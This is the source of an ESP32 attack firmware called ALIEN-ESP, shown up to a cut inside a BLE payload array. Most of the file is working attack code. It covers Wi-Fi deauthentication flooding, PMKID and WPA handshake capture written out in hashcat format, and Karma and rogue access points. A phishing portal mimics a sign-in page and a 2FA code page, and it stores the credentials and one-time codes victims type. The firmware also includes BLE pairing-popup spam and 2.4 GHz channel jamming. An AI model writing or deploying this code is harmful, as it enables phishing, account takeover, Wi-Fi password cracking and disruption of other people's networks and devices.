// ALIEN-ESP v2.7.10

#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <Update.h>
#include <SPIFFS.h>
#include <SPI.h>
#include <RF24.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include <math.h>

#define SCREEN_W 128
#define SCREEN_H  64
#define SDA_PIN   21
#define SCL_PIN   22
#define BTN_PIN    0
#define NRF_CE    27
#define NRF_CSN   26
#define VERSION "2.7.10"

Adafruit_SSD1306 display(SCREEN_W, SCREEN_H, &Wire, -1);

enum Screen {
  SCR_BOOT, SCR_MENU,
  SCR_AUTO, SCR_PMKID, SCR_DEAUTH, SCR_TARGET_DEAUTH,
  SCR_KARMA, SCR_ROGUE, SCR_2FA,
  SCR_BLESPAM, SCR_RFSWEEP,
  SCR_WSCAN, SCR_PROBE, SCR_PACKET, SCR_BEACON,
  SCR_HIDDEN, SCR_CONGEST,
  SCR_INFO, SCR_OTA, SCR_OFF
};
Screen scr = SCR_BOOT;

int menu_sel = 0;
const char* menu_items[] = {
  "Auto Attack", "PMKID", "Deauth", "Targeted Deauth",
  "Karma Portal", "Rogue AP", "2FA Portal",
  "BLE Spam", "RF Sweep",
  "WiFi Scan", "Probe Sniff", "Packet Mon", "Beacon Spam",
  "Hidden SSID", "Congestion",
  "Info", "OTA Update", "Off"
};
const int MENU_COUNT = 18;

uint32_t frame = 0;
int blink_timer = 0;
bool blinking = false;
int next_blink = 200;
float temp_avg = 0;
bool glow_mode = false;

uint32_t creds_captured = 0;
uint32_t otp_captured = 0;
uint32_t portal_clients = 0;
char last_user[40] = {0};
char last_pass[40] = {0};
char last_otp[12] = {0};
DNSServer dnsServer;
WebServer webServer(80);

bool twofa_mode = false;

struct APEntry { uint8_t bssid[6]; uint8_t channel; char ssid[33]; int8_t rssi; bool wpa2; };
static APEntry ap_db[32];
static int ap_count = 0;

struct ClientEntry { uint8_t mac[6]; int8_t rssi; };
static ClientEntry client_db[16];
static int client_count = 0;
static int client_sel = 0;

static int target_idx = -1;
static uint8_t target_bssid[6];
static uint8_t target_ch = 1;
static char target_ssid[33] = {0};

static uint32_t pmkid_hits = 0;
static uint32_t eapol_hits = 0;
static uint32_t deauth_sent = 0;
uint8_t current_ch = 1;
uint32_t last_hop_ms = 0;
uint32_t last_deauth_ms = 0;

struct Handshake {
  uint8_t sta_mac[6];
  uint8_t ap_mac[6];
  uint8_t anonce[32];
  bool has_anonce;
  uint8_t mic[16];
  bool has_mic;
  uint8_t eapol_msg2[256];
  uint16_t eapol_msg2_len;
  char ssid[33];
  uint8_t ssid_len;
  bool used;
};
static Handshake hs_db[4];

static bool ble_inited = false;
uint32_t ble_spam_count = 0;

RF24 nrf(NRF_CE, NRF_CSN);
static bool nrf_ready = false;
static bool nrf_checked = false;
uint32_t nrf_jam_count = 0;

static int scan_ap_count = 0;
static char scan_ssids[8][33];
static int8_t scan_rssi[8];
static uint8_t scan_ch[8];
uint32_t last_scan_ms = 0;

static char probe_pool[16][33];
static int probe_count = 0;
char probe_last[33] = {0};

static char hidden_ssids[8][33];
static uint8_t hidden_bssid[8][6];
static int hidden_count = 0;

static uint8_t congestion[13] = {0};

static uint32_t packet_count = 0;
static uint32_t beacon_count = 0;
static uint32_t beacon_idx = 0;

static char karma_pool[16][33];
static int karma_count = 0;
static char rogue_ssid[33] = {0};

uint32_t heap_min = 999999;
uint32_t stored_creds = 0;
uint32_t stored_pmkid = 0;
uint32_t stored_eapol = 0;

bool btn_last = HIGH;
uint32_t btn_down_ms = 0;
bool btn_long_fired = false;

static float read_temp() {
  uint32_t sum = 0;
  for (int i = 0; i < 8; i++) {
    sum += temperatureRead();
    delayMicroseconds(100);
  }
  float raw = sum / 8.0f;
  float c = raw - 12.0f;
  if (c < 0) c = 0;
  return c;
}

WebServer otaServer(80);

const char* ota_page = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>ALIEN ESP</title>
<style>
body{font-family:-apple-system,system-ui,sans-serif;background:#000;color:#ccc;margin:0;padding:20px;display:flex;justify-content:center;align-items:center;min-height:100vh;}
.box{background:#111;border:1px solid #222;border-radius:6px;padding:24px;width:100%;max-width:320px;}
h1{margin:0 0 4px;color:#4af;font-size:18px;font-weight:600;letter-spacing:1px;}
.sub{color:#555;font-size:11px;margin-bottom:20px;}
input[type=file]{width:100%;padding:10px;background:#0a0a0a;border:1px solid #262626;border-radius:4px;color:#888;font-size:12px;box-sizing:border-box;}
button{width:100%;padding:12px;margin-top:10px;background:#4af;color:#000;border:none;border-radius:4px;font-size:13px;font-weight:600;cursor:pointer;letter-spacing:1px;}
button:disabled{background:#262626;color:#666;cursor:not-allowed;}
.bar{height:3px;background:#0a0a0a;margin-top:14px;overflow:hidden;}
.bar span{display:block;height:100%;background:#4af;width:0;transition:width 0.15s;}
.status{margin-top:10px;color:#555;font-size:11px;text-align:center;letter-spacing:1px;}
.ok{color:#4c4;}
.err{color:#c44;}
</style>
</head>
<body>
<div class="box">
<h1>ALIEN ESP</h1>
<div class="sub">firmware update</div>
<form id="f">
<input type="file" name="firmware" accept=".bin" id="file" required>
<button type="submit" id="btn">upload</button>
<div class="bar"><span id="bar"></span></div>
<div class="status" id="s">ready</div>
</form>
</div>
<script>
document.getElementById('f').addEventListener('submit', function(e) {
  e.preventDefault();
  var file = document.getElementById('file').files[0];
  if (!file) return;
  var btn = document.getElementById('btn');
  var bar = document.getElementById('bar');
  var s = document.getElementById('s');
  btn.disabled = true;
  s.className = 'status';
  s.textContent = Math.round(file.size / 1024) + ' KB';
  var xhr = new XMLHttpRequest();
  xhr.upload.onprogress = function(ev) {
    var pct = Math.round(ev.loaded / ev.total * 100);
    bar.style.width = pct + '%';
    s.textContent = pct + '%';
  };
  xhr.onload = function() {
    s.className = 'status ok';
    s.textContent = 'rebooting';
  };
  xhr.onerror = function() {
    s.className = 'status err';
    s.textContent = 'failed';
    btn.disabled = false;
  };
  xhr.open('POST', '/ota');
  xhr.send(new FormData(document.getElementById('f')));
});
</script>
</body>
</html>
)rawliteral";

void ota_handle_root() { otaServer.send(200, "text/html", ota_page); }

void ota_handle_upload() {
  HTTPUpload& up = otaServer.upload();
  if (up.status == UPLOAD_FILE_START) {
    Serial.printf("ota start %s\n", up.filename.c_str());
    if (!Update.begin(UPDATE_SIZE_UNKNOWN)) Update.printError(Serial);
  } else if (up.status == UPLOAD_FILE_WRITE) {
    if (Update.write(up.buf, up.currentSize) != up.currentSize) Update.printError(Serial);
  } else if (up.status == UPLOAD_FILE_END) {
    if (Update.end(true)) Serial.printf("ota ok %u\n", up.totalSize);
    else Update.printError(Serial);
  }
}

void ota_handle_done() {
  otaServer.send(200, "text/plain", Update.hasError() ? "FAIL" : "OK");
  delay(500);
  ESP.restart();
}

static void fill_ellipse_white(int cx, int cy, int rw, int rh) {
  if (rh <= 0 || rw <= 0) return;
  for (int dy = -rh; dy <= rh; dy++) {
    float f = (float)dy / (float)rh;
    float inside = 1.0f - f * f;
    if (inside < 0) inside = 0;
    int dx = (int)(rw * sqrtf(inside));
    display.drawFastHLine(cx - dx, cy + dy, 2 * dx + 1, SSD1306_WHITE);
  }
}

static void fill_rot_ellipse_black(int cx, int cy, int rw, int rh, float ang) {
  float ca = cosf(ang), sa = sinf(ang);
  for (int dx = -rw; dx <= rw; dx++) {
    for (int dy = -rh; dy <= rh; dy++) {
      float nx = (float)dx / (float)rw;
      float ny = (float)dy / (float)rh;
      if (nx * nx + ny * ny <= 1.0f) {
        int px = cx + (int)(dx * ca - dy * sa + 0.5f);
        int py = cy + (int)(dx * sa + dy * ca + 0.5f);
        if (px >= 0 && px < SCREEN_W && py >= 0 && py < SCREEN_H)
          display.drawPixel(px, py, SSD1306_BLACK);
      }
    }
  }
}

static void draw_alien() {
  fill_ellipse_white(64, 18, 19, 17);
  fill_ellipse_white(64, 33, 12, 11);

  if (!blinking) {
    fill_rot_ellipse_black(52, 24, 9, 5, 0.48f);
    fill_rot_ellipse_black(76, 24, 9, 5, -0.48f);
  } else {
    display.drawLine(42, 24, 60, 24, SSD1306_BLACK);
    display.drawLine(42, 25, 60, 25, SSD1306_BLACK);
    display.drawLine(68, 24, 86, 24, SSD1306_BLACK);
    display.drawLine(68, 25, 86, 25, SSD1306_BLACK);
  }

  display.fillRect(56, 39, 16, 1, SSD1306_BLACK);
  display.fillRect(58, 40, 12, 1, SSD1306_BLACK);
  display.fillRect(60, 41, 8, 1, SSD1306_BLACK);
}

static void draw_alien_glow() {
  fill_ellipse_white(64, 18, 19, 17);
  fill_ellipse_white(64, 33, 12, 11);

  fill_rot_ellipse_black(52, 24, 9, 5, 0.48f);
  fill_rot_ellipse_black(76, 24, 9, 5, -0.48f);

  if (blinking) {
    display.drawLine(42, 24, 60, 24, SSD1306_BLACK);
    display.drawLine(42, 25, 60, 25, SSD1306_BLACK);
    display.drawLine(68, 24, 86, 24, SSD1306_BLACK);
    display.drawLine(68, 25, 86, 25, SSD1306_BLACK);
  } else {
    float phase = (frame % 90) / 90.0f * 2.0f * M_PI;
    float breathe = (sinf(phase) + 1.0f) * 0.5f;
    int r = (int)(breathe * 2.0f + 0.5f);

    int glints[][2] = {
      {49, 24}, {55, 24}, {52, 21}, {52, 27},
      {73, 24}, {79, 24}, {76, 21}, {76, 27},
    };
    for (int i = 0; i < 8; i++) display.drawPixel(glints[i][0], glints[i][1], SSD1306_WHITE);

    if (r >= 1) {
      display.fillCircle(52, 24, r, SSD1306_WHITE);
      display.fillCircle(76, 24, r, SSD1306_WHITE);
    } else {
      display.drawPixel(52, 24, SSD1306_WHITE);
      display.drawPixel(76, 24, SSD1306_WHITE);
    }
    display.drawPixel(52, 24, SSD1306_WHITE);
    display.drawPixel(76, 24, SSD1306_WHITE);
  }

  display.fillRect(56, 39, 16, 1, SSD1306_BLACK);
  display.fillRect(58, 40, 12, 1, SSD1306_BLACK);
  display.fillRect(60, 41, 8, 1, SSD1306_BLACK);
}

static void draw_alien_auto() {
  if (glow_mode) draw_alien_glow();
  else draw_alien();
}

static void spiffs_init() {
  if (!SPIFFS.begin(true)) {
    Serial.println("spiffs fail");
    return;
  }
  Serial.println("spiffs ok");
}

static void spiffs_append(const char* path, const char* line) {
  File f = SPIFFS.open(path, FILE_APPEND);
  if (!f) f = SPIFFS.open(path, FILE_WRITE);
  if (!f) return;
  f.println(line);
  f.close();
}

static uint32_t spiffs_count(const char* path) {
  File f = SPIFFS.open(path, FILE_READ);
  if (!f) return 0;
  uint32_t n = 0;
  while (f.available()) { f.readStringUntil('\n'); n++; }
  f.close();
  return n;
}

static void spiffs_refresh() {
  stored_creds = spiffs_count("/creds.txt");
  stored_pmkid = spiffs_count("/pmkid.txt");
  stored_eapol = spiffs_count("/eapol.txt");
}

static void check_nrf() {
  if (nrf_checked) return;
  nrf_checked = true;
  SPI.begin();
  if (nrf.begin()) {
    nrf.setAutoAck(false);
    nrf.setDataRate(RF24_2MBPS);
    nrf.setPALevel(RF24_PA_MAX);
    nrf.setPayloadSize(32);
    nrf.stopListening();
    nrf_ready = true;
    Serial.println("nrf ok");
  } else {
    Serial.println("nrf not found");
  }
}

static void nrf_sweep_burst() {
  if (!nrf_ready) return;
  uint8_t junk[32];
  for (int i = 0; i < 32; i++) junk[i] = random(256);
  for (uint8_t ch = 0; ch <= 125; ch++) {
    nrf.setChannel(ch);
    nrf.write(&junk, 32);
  }
  nrf_jam_count++;
}

static void draw_wifi_theme() {
  int cx = 64, cy = 5;
  uint8_t phase = (frame / 5) % 4;
  for (int i = 0; i < 3; i++) {
    if (i == phase) continue;
    display.drawCircleHelper(cx, cy, 2 + i * 3, 0b1100, SSD1306_WHITE);
  }
  display.fillCircle(cx, cy, 1, SSD1306_WHITE);
}

static void draw_ble_theme() {
  int cx = 64, cy = 5;
  display.drawFastVLine(cx, cy - 4, 9, SSD1306_WHITE);
  display.drawLine(cx, cy - 4, cx + 3, cy - 2, SSD1306_WHITE);
  display.drawLine(cx + 3, cy - 2, cx - 3, cy + 2, SSD1306_WHITE);
  display.drawLine(cx, cy + 4, cx + 3, cy + 2, SSD1306_WHITE);
  display.drawLine(cx + 3, cy + 2, cx - 3, cy - 2, SSD1306_WHITE);
}

static void draw_status(const char* l1, const char* l2) {
  display.fillRect(0, 45, 128, 19, SSD1306_BLACK);
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 47);
  display.print(l1);
  if (l2 && l2[0]) {
    display.setCursor(0, 56);
    display.print(l2);
  }
}

static void draw_menu() {
  display.clearDisplay();
  display.setTextSize(1);
  int start = 0;
  if (menu_sel > 4) start = menu_sel - 4;
  if (start + 6 > MENU_COUNT) start = MENU_COUNT - 6;
  if (start < 0) start = 0;
  for (int i = 0; i < 6 && start + i < MENU_COUNT; i++) {
    int idx = start + i;
    int y = 3 + i * 10;
    if (idx == menu_sel) {
      display.fillRect(0, y - 1, 128, 10, SSD1306_WHITE);
      display.setTextColor(SSD1306_BLACK);
    } else {
      display.setTextColor(SSD1306_WHITE);
    }
    display.setCursor(5, y + 1);
    display.print(menu_items[idx]);
  }
  display.display();
}

const char* portal_html = R"rawliteral(
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Sign In</title>
<style>
body{font-family:-apple-system,Roboto,Arial;background:#f0f2f5;margin:0;display:flex;justify-content:center;align-items:center;height:100vh;}
.card{background:#fff;padding:32px 28px;border-radius:14px;box-shadow:0 6px 24px rgba(0,0,0,.12);width:300px;}
h2{margin:0 0 24px;text-align:center;color:#1a1a1a;font-weight:600;font-size:20px;}
input{width:100%;padding:13px;margin:7px 0;border:1px solid #dadce0;border-radius:8px;font-size:15px;box-sizing:border-box;outline:none;}
input:focus{border-color:#1a73e8;}
button{width:100%;padding:13px;margin-top:20px;background:#1a73e8;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:500;}
</style></head><body>
<div class="card"><h2>Sign in</h2>
<form method="POST" action="/login">
<input name="username" placeholder="Email or phone" required>
<input name="password" type="password" placeholder="Password" required>
<button type="submit">Next</button>
</form></div></body></html>
)rawliteral";

const char* portal_2fa_html = R"rawliteral(
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Two-Factor</title>
<style>
body{font-family:-apple-system,Roboto,Arial;background:#f0f2f5;margin:0;display:flex;justify-content:center;align-items:center;height:100vh;}
.card{background:#fff;padding:32px 28px;border-radius:14px;box-shadow:0 6px 24px rgba(0,0,0,.12);width:300px;}
h2{margin:0 0 8px;text-align:center;color:#1a1a1a;font-weight:600;font-size:19px;}
p{text-align:center;color:#5f6368;font-size:13px;margin:0 0 22px;}
input{width:100%;padding:14px;margin:8px 0;border:1px solid #dadce0;border-radius:8px;font-size:22px;text-align:center;letter-spacing:10px;box-sizing:border-box;outline:none;}
input:focus{border-color:#1a73e8;}
button{width:100%;padding:13px;margin-top:16px;background:#1a73e8;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:500;}
</style></head><body>
<div class="card"><h2>Verify it's you</h2>
<p>Enter the 6-digit code sent to your phone</p>
<form method="POST" action="/verify">
<input name="otp" maxlength="6" pattern="[0-9]{6}" placeholder="------" required autofocus inputmode="numeric">
<button type="submit">Verify</button>
</form></div></body></html>
)rawliteral";

const char* portal_success_html = R"rawliteral(
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Connecting</title>
<style>
body{font-family:-apple-system,Roboto,Arial;background:#f0f2f5;margin:0;display:flex;justify-content:center;align-items:center;height:100vh;}
.card{background:#fff;padding:32px 28px;border-radius:14px;box-shadow:0 6px 24px rgba(0,0,0,.12);width:300px;text-align:center;}
h2{margin:0 0 12px;color:#1a1a1a;font-weight:600;font-size:19px;}
p{color:#5f6368;font-size:14px;margin:0;}
</style></head><body>
<div class="card"><h2>Connected</h2><p>You can close this page.</p></div>
</body></html>
)rawliteral";

void handle_root() { webServer.send(200, "text/html", portal_html); }

void handle_login() {
  if (webServer.hasArg("username") && webServer.hasArg("password")) {
    String u = webServer.arg("username");
    String p = webServer.arg("password");
    u.toCharArray(last_user, sizeof(last_user));
    p.toCharArray(last_pass, sizeof(last_pass));
    creds_captured++;
    char buf[128];
    snprintf(buf, sizeof(buf), "STAGE1|%s|%s", last_user, last_pass);
    spiffs_append("/creds.txt", buf);
    spiffs_refresh();
    Serial.printf("[login] %s : %s\n", last_user, last_pass);
  }
  if (twofa_mode) {
    webServer.send(200, "text/html", portal_2fa_html);
  } else {
    webServer.send(200, "text/html", portal_success_html);
  }
}

void handle_verify() {
  if (webServer.hasArg("otp")) {
    String o = webServer.arg("otp");
    o.toCharArray(last_otp, sizeof(last_otp));
    otp_captured++;
    char buf[128];
    snprintf(buf, sizeof(buf), "STAGE2|%s|%s|%s", last_user, last_pass, last_otp);
    spiffs_append("/creds.txt", buf);
    spiffs_refresh();
    Serial.printf("[otp] %s\n", last_otp);
  }
  webServer.send(200, "text/html", portal_success_html);
}

void handle_notfound() { webServer.send(200, "text/html", portal_html); }

static void hex_to(char* out, const uint8_t* p, int n) {
  static const char* h = "0123456789abcdef";
  for (int i = 0; i < n; i++) {
    out[i*2] = h[p[i] >> 4];
    out[i*2+1] = h[p[i] & 0xF];
  }
  out[n*2] = 0;
}

static const char* ssid_for(const uint8_t* bssid) {
  for (int i = 0; i < ap_count; i++)
    if (memcmp(ap_db[i].bssid, bssid, 6) == 0) return ap_db[i].ssid;
  return "";
}

static void add_ap(const uint8_t* bssid, uint8_t ch, const char* ssid, int len) {
  for (int i = 0; i < ap_count; i++)
    if (memcmp(ap_db[i].bssid, bssid, 6) == 0) return;
  if (ap_count >= 32) return;
  memcpy(ap_db[ap_count].bssid, bssid, 6);
  ap_db[ap_count].channel = ch;
  int n = len > 32 ? 32 : len;
  memcpy(ap_db[ap_count].ssid, ssid, n);
  ap_db[ap_count].ssid[n] = 0;
  ap_count++;
}

static uint8_t deauth_frame[26];

static void send_deauth_to(const uint8_t* dst, const uint8_t* src, const uint8_t* bssid) {
  deauth_frame[0] = 0xC0; deauth_frame[1] = 0x00;
  deauth_frame[2] = 0x00; deauth_frame[3] = 0x00;
  memcpy(deauth_frame + 4, dst, 6);
  memcpy(deauth_frame + 10, src, 6);
  memcpy(deauth_frame + 16, bssid, 6);
  deauth_frame[22] = 0x00; deauth_frame[23] = 0x00;
  deauth_frame[24] = 0x07; deauth_frame[25] = 0x00;
  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), true);
  deauth_sent++;
}

static void send_deauth_bcast(const uint8_t* bssid) {
  const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  send_deauth_to(bcast, bssid, bssid);
}

static Handshake* hs_find(const uint8_t* sta, const uint8_t* ap) {
  for (int i = 0; i < 4; i++)
    if (hs_db[i].used && memcmp(hs_db[i].sta_mac, sta, 6) == 0 && memcmp(hs_db[i].ap_mac, ap, 6) == 0)
      return &hs_db[i];
  for (int i = 0; i < 4; i++) {
    if (!hs_db[i].used) {
      memset(&hs_db[i], 0, sizeof(Handshake));
      memcpy(hs_db[i].sta_mac, sta, 6);
      memcpy(hs_db[i].ap_mac, ap, 6);
      hs_db[i].used = true;
      return &hs_db[i];
    }
  }
  return &hs_db[0];
}

static void eapol_dump(Handshake* hs) {
  char mic_hex[33], ap_hex[13], sta_hex[13], ssid_hex[65], anonce_hex[65], eapol_hex[513];
  hex_to(mic_hex, hs->mic, 16);
  hex_to(ap_hex, hs->ap_mac, 6);
  hex_to(sta_hex, hs->sta_mac, 6);
  hex_to(ssid_hex, (uint8_t*)hs->ssid, hs->ssid_len);
  hex_to(anonce_hex, hs->anonce, 32);
  hex_to(eapol_hex, hs->eapol_msg2, hs->eapol_msg2_len);

  Serial.printf("WPA*02*%s*%s*%s*%s*%s*%s*02\n",
    mic_hex, ap_hex, sta_hex, ssid_hex, anonce_hex, eapol_hex);

  char buf[1200];
  snprintf(buf, sizeof(buf), "WPA*02*%s*%s*%s*%s*%s*%s*02",
    mic_hex, ap_hex, sta_hex, ssid_hex, anonce_hex, eapol_hex);
  spiffs_append("/eapol.txt", buf);
  eapol_hits++;
}

static void pmkid_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t* p = pkt->payload;
  uint16_t len = pkt->rx_ctrl.sig_len;

  if ((p[0] & 0xF0) == 0x80 && len > 40) {
    if (p[36] == 0x00 && p[37] > 0 && p[37] <= 32) {
      uint8_t ch = 0;
      int pos = 36 + 2 + p[37];
      while (pos + 2 < len) {
        if (p[pos] == 0x03 && p[pos+1] == 0x01) { ch = p[pos+2]; break; }
        pos += 2 + p[pos+1];
      }
      add_ap(p + 16, ch, (const char*)&p[38], p[37]);
    }
    return;
  }

  if (len < 100) return;
  int hdr = ((p[0] & 0x80) == 0x80) ? 26 : 24;
  for (int i = hdr; i < len - 8; i++) {
    if (p[i] == 0xAA && p[i+1] == 0xAA && p[i+2] == 0x03 && p[i+3] == 0x00 &&
        p[i+4] == 0x00 && p[i+5] == 0x00 && p[i+6] == 0x88 && p[i+7] == 0x8E) {

      int e = i + 8;
      if (p[e+1] != 0x03) return;
      if (e + 99 > len) return;

      uint8_t klo = p[e+5], khi = p[e+6];
      bool ack = (klo & 0x80) != 0;
      bool mic = (khi & 0x01) != 0;
      bool install = (klo & 0x40) != 0;
      bool secure = (khi & 0x02) != 0;

      uint8_t* ap_mac = p + 16;
      uint8_t* sta_mac = p + 10;
      uint8_t* nonce = p + e + 17;
      uint8_t* micp = p + e + 81;
      uint16_t kd_len = (p[e+97] << 8) | p[e+98];
      uint16_t eapol_body = (p[e+2] << 8) | p[e+3];
      uint16_t full_eapol_len = eapol_body + 4;

      if (ack && !mic && kd_len >= 20) {
        int kd_start = e + 99;
        int pos = kd_start, end = kd_start + kd_len;
        while (pos + 6 < end) {
          if (p[pos] == 0xDD && p[pos+1] >= 0x14 && p[pos+2] == 0x00 &&
              p[pos+3] == 0x0F && p[pos+4] == 0xAC && p[pos+5] == 0x04) {
            const uint8_t* pmkid = p + pos + 6;
            const char* ssid = ssid_for(ap_mac);
            pmkid_hits++;
            char pmkid_hex[33], ap_h[13], sta_h[13], ssid_hex[65];
            hex_to(pmkid_hex, pmkid, 16);
            hex_to(ap_h, ap_mac, 6);
            hex_to(sta_h, sta_mac, 6);
            hex_to(ssid_hex, (uint8_t*)ssid, strlen(ssid));
            Serial.printf("WPA*01*%s*%s*%s*%s***\n", pmkid_hex, ap_h, sta_h, ssid_hex);
            char buf2[256];
            snprintf(buf2, sizeof(buf2), "WPA*01*%s*%s*%s*%s***", pmkid_hex, ap_h, sta_h, ssid_hex);
            spiffs_append("/pmkid.txt", buf2);
            break;
          }
          int l = p[pos+1];
          if (l == 0) break;
          pos += 2 + l;
        }
      }

      Handshake* hs = hs_find(sta_mac, ap_mac);

      if (ack && !mic) {
        memcpy(hs->anonce, nonce, 32);
        hs->has_anonce = true;
        const char* ssid = ssid_for(ap_mac);
        int sl = strlen(ssid);
        if (sl > 32) sl = 32;
        memcpy(hs->ssid, ssid, sl);
        hs->ssid[sl] = 0;
        hs->ssid_len = sl;
      } else if (!ack && mic && !install && !secure) {
        memcpy(hs->mic, micp, 16);
        hs->has_mic = true;
        if (full_eapol_len <= 256) {
          memcpy(hs->eapol_msg2, p + e, full_eapol_len);
          hs->eapol_msg2_len = full_eapol_len;
        }
      }

      if (hs->has_anonce && hs->has_mic && hs->eapol_msg2_len > 0) {
        eapol_dump(hs);
        hs->used = false;
        spiffs_refresh();
      }
      return;
    }
  }
}

static void karma_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT) return;
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t* p = pkt->payload;
  uint16_t len = pkt->rx_ctrl.sig_len;
  if (len < 28) return;
  if ((p[0] & 0xFC) != 0x40) return;
  uint8_t tlen = p[25];
  if (p[24] != 0 || tlen == 0 || tlen > 32) return;
  if (26 + tlen > len) return;
  for (int i = 0; i < karma_count; i++)
    if (strlen(karma_pool[i]) == tlen && memcmp(karma_pool[i], &p[26], tlen) == 0) return;
  if (karma_count < 16) {
    memcpy(karma_pool[karma_count], &p[26], tlen);
    karma_pool[karma_count][tlen] = 0;
    Serial.printf("[probe] %s\n", karma_pool[karma_count]);
    karma_count++;
  }
}

static void probe_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT) return;
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t* p = pkt->payload;
  uint16_t len = pkt->rx_ctrl.sig_len;
  if (len < 28) return;
  if ((p[0] & 0xFC) != 0x40) return;
  uint8_t tlen = p[25];
  if (p[24] != 0 || tlen == 0 || tlen > 32) return;
  if (26 + tlen > len) return;
  for (int i = 0; i < probe_count; i++)
    if (strlen(probe_pool[i]) == tlen && memcmp(probe_pool[i], &p[26], tlen) == 0) return;
  if (probe_count < 16) {
    memcpy(probe_pool[probe_count], &p[26], tlen);
    probe_pool[probe_count][tlen] = 0;
    memcpy(probe_last, &p[26], tlen);
    probe_last[tlen] = 0;
    probe_count++;
  }
}

static void hidden_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT) return;
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t* p = pkt->payload;
  uint16_t len = pkt->rx_ctrl.sig_len;
  if (len < 40) return;
  if ((p[0] & 0xFC) != 0x50) return;
  if (p[36] != 0x00) return;
  uint8_t sl = p[37];
  if (sl == 0 || sl > 32) return;
  if (36 + 2 + sl > len) return;
  for (int i = 0; i < hidden_count; i++) {
    if (memcmp(hidden_bssid[i], p+16, 6) == 0) {
      if (strncmp(hidden_ssids[i], (const char*)&p[38], sl) != 0) {
        memcpy(hidden_ssids[i], &p[38], sl);
        hidden_ssids[i][sl] = 0;
        Serial.printf("[hidden] %s\n", hidden_ssids[i]);
      }
      return;
    }
  }
  if (hidden_count < 8) {
    memcpy(hidden_bssid[hidden_count], p+16, 6);
    memcpy(hidden_ssids[hidden_count], &p[38], sl);
    hidden_ssids[hidden_count][sl] = 0;
    hidden_count++;
    Serial.printf("[hidden] %s\n", hidden_ssids[hidden_count-1]);
  }
}

static void packet_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
  packet_count++;
  if (current_ch >= 1 && current_ch <= 13) {
    if (congestion[current_ch-1] < 255) congestion[current_ch-1]++;
  }
}

static void client_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t* p = pkt->payload;
  uint16_t len = pkt->rx_ctrl.sig_len;
  if (len < 24) return;
  uint8_t* a1 = p + 4, *a2 = p + 10, *a3 = p + 16;

  uint8_t* c = nullptr;
  if (memcmp(a3, target_bssid, 6) == 0) c = a1;
  else if (memcmp(a2, target_bssid, 6) == 0) c = a2;
  else if (memcmp(a1, target_bssid, 6) == 0) c = a2;
  else return;
  if (c[0] & 0x01) return;

  for (int i = 0; i < client_count; i++) {
    if (memcmp(client_db[i].mac, c, 6) == 0) {
      client_db[i].rssi = pkt->rx_ctrl.rssi;
      return;
    }
  }
  if (client_count < 16) {
    memcpy(client_db[client_count].mac, c, 6);
    client_db[client_count].rssi = pkt->rx_ctrl.rssi;
    client_count++;
  }
}

static void scan_aps() {
  ap_count = 0;
  int n = WiFi.scanNetworks();
  for (int i = 0; i < n && ap_count < 32; i++) {
    int enc = WiFi.encryptionType(i);
    if (enc == WIFI_AUTH_OPEN || enc == WIFI_AUTH_WPA3_PSK) continue;
    memcpy(ap_db[ap_count].bssid, WiFi.BSSID(i), 6);
    ap_db[ap_count].channel = WiFi.channel(i);
    ap_db[ap_count].rssi = WiFi.RSSI(i);
    strncpy(ap_db[ap_count].ssid, WiFi.SSID(i).c_str(), 32);
    ap_db[ap_count].ssid[32] = 0;
    ap_db[ap_count].wpa2 = (enc == WIFI_AUTH_WPA2_PSK || enc == WIFI_AUTH_WPA_WPA2_PSK);
    ap_count++;
  }
  WiFi.scanDelete();
}

static void send_apple() {
  BLEAdvertisementData adv;
  uint8_t payload[] = {0x1E,0xFF,0x4C,0x00,0x07,0x19,0x07,0x0E,0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
  payload[6] = random(0, 0xFF);
  payload[7] = random(0, 0xFF);
  adv.addData((char*)payload, sizeof(payload));
  BLEAdvertising* a = BLEDevice::getAdvertising();
  a->setAdvertisementData(adv);
  BLEDevice::startAdvertising();
}

static void send_samsung() {
  BLEAdvertisementData adv;
  uint8_t payload[] = {0x1B,0xFF,0x75,0x00,0x01,0x00,0x02,0x00,0x01,0x01,0xFF,0x00,0x00,0x43,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
  payload[5] = random(0, 0xFF);
  adv.addData((char*)payload, sizeof(payload));
  BLEAdvertising* a = BLEDevice::getAdvertising();
  a->setAdvertisementData(adv);
  BLEDevice::startAdvertising();
}

static void send_windows() {
  BLEAdvertisementData adv;
  uint8_t payload[] = {0x14,0xFF,0x06,0x00,0x03,0x00,0x80,0x12,0x53,0x6B,0x75,0x6C,0x6C,0x00};
